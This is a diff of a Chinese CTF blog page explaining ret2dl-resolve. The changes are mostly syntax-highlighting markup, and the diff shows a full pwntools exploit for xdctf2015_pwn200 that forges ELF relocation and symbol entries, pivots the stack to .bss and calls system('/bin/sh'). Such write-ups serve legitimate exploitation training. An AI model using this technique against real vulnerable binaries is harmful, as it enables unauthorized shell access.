@@ -3,7 +3,7 @@
 
 
 <head>
-    <meta charset="utf-8">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="keywords" content="ret2dl-resolve(1)：原理及基础利用, 翰青HanQi&#39;s Blog">
     <meta name="description" content="ret2dl_resolve的原理解读及32位基础利用方式">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -52,12 +52,12 @@
 
 <meta name="generator" content="Hexo 6.3.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="翰青HanQi's Blog" type="application/atom+xml">
-</head>
+<link rel="alternate" href="/atom.xml" title="翰青HanQi's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
-    <header class="navbar-fixed">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
     <nav id="headNav" class="bg-color nav-transparent">
         <div id="navContainer" class="nav-wrapper container">
             <div class="brand-logo">
@@ -420,9 +420,6 @@
         <hr class="clearfix">
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
 
         
 
@@ -443,14 +440,14 @@
 </ol>
 <h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_3.png"></p>
 <p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_1.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_2.png"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 启动程序</span>
-<span class="token comment"># io = remote('node4.buuoj.cn',26320)</span>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 启动程序</span>
+<span class="token comment" spellcheck="true"># io = remote('node4.buuoj.cn',26320)</span>
 io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span>
-<span class="token comment"># io = gdb.debug('./bof')</span>
+<span class="token comment" spellcheck="true"># io = gdb.debug('./bof')</span>
 e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span>
-<span class="token comment"># libc = ELF('./')</span>
+<span class="token comment" spellcheck="true"># libc = ELF('./')</span>
 
-<span class="token comment"># 源程序gadget</span>
+<span class="token comment" spellcheck="true"># 源程序gadget</span>
 write_plt <span class="token operator">=</span> <span class="token number">0x80483C0</span>
 vuln <span class="token operator">=</span> <span class="token number">0x80484D6</span>
 bss_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -458,13 +455,13 @@ pop_ebp <span class="token operator">=</span> <span class="token number">0x80486
 leave_ret <span class="token operator">=</span> <span class="token number">0x8048445</span>
 pop_ebx_esi_edi_ebp <span class="token operator">=</span> <span class="token number">0x8048628</span>
 
-<span class="token comment"># 程序中section地址</span>
+<span class="token comment" spellcheck="true"># 程序中section地址</span>
 plt0 <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
 rel_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
 dynsym <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
 dynstr <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
 
-<span class="token comment"># 伪造相应结构</span>
+<span class="token comment" spellcheck="true"># 伪造相应结构</span>
 stack_size <span class="token operator">=</span> <span class="token number">0x800</span>
 base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size
 fake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">32</span>
@@ -475,7 +472,7 @@ st_name <span class="token operator">=</span> fake_dynstr_addr <span class="toke
 st_value <span class="token operator">=</span> <span class="token number">0</span>
 st_size <span class="token operator">=</span> <span class="token number">0</span>
 st_info <span class="token operator">=</span> <span class="token number">0x12</span>
-<span class="token comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>
+<span class="token comment" spellcheck="true">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>
 fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_value<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_size<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_info<span class="token punctuation">)</span>
 fake_rel_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">24</span>
 reloc_arg <span class="token operator">=</span> fake_rel_addr<span class="token operator">-</span>rel_plt
@@ -484,22 +481,23 @@ r_type <span class="token operator">=</span> <span class="token number">0x7</spa
 r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_sym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r_type<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>
 r_offset <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
 fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
-fake_dynstr <span class="token operator">=</span> <span class="token string">b'system\x00'</span>
+fake_dynstr <span class="token operator">=</span> b<span class="token string">'system\x00'</span>
 
-<span class="token comment"># stack pivot</span>
+<span class="token comment" spellcheck="true"># stack pivot</span>
 io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token number">-4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_migrate<span class="token punctuation">)</span>
 pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-<span class="token comment"># ret2dl_resolve</span>
+<span class="token comment" spellcheck="true"># ret2dl_resolve</span>
 binsh_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">80</span>
-payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> <span class="token string">b'/bin/sh\x00'</span>
-payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'a'</span>
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> b<span class="token string">'/bin/sh\x00'</span>
+payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token string">'a'</span>
 io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章！<br>最最最详细(包括64位利用细节)：<a target="_blank" rel="noopener" href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br>最最最容易理解：<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/ba418f23.html">关于ret2_dl_runtime_resolve的学习总结</a><br>以及CTF权威指南(Pwn篇)</p>
 
                 
@@ -986,9 +984,6 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
-
 
 <!-- 代码语言 -->
 
@@ -1432,7 +1427,7 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
     
 
 </body>
